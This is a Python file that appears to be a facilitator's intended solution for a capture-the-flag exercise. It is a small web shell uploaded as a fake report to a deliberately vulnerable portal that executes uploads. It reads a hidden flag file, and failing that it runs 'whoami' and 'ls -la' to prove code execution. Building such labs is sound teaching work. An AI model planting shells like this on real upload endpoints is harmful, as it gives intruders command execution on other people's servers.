# Sample "report" that is actually a WEB SHELL -- demonstrates VULN-3.
# A Red player uploads this via /reports, then clicks "Run". Because /run
# executes uploaded Python, this reads the flag the server hid for the
# upload-RCE challenge and prints it back in the HTTP response.
#
# This is the INTENDED SOLUTION for the file-upload bug. Keep it in the
# facilitator folder; do NOT leave it in portal/uploads/.

import os, subprocess

# NOTE: runs under exec() inside the portal, so __file__ is NOT available here.
# The web shell inherits the portal's working directory; find the secret flag.
candidates = [
    os.path.join(os.getcwd(), "secret", "shell_flag.txt"),
    os.path.join(os.getcwd(), "portal", "secret", "shell_flag.txt"),
    "secret/shell_flag.txt",
]
for path in candidates:
    if os.path.exists(path):
        print("shell_flag.txt =>", open(path).read().strip())
        break
else:
    # Fall back to a real command to prove arbitrary execution.
    print("whoami =>", subprocess.getoutput("whoami"))
    print("ls =>", subprocess.getoutput("ls -la"))
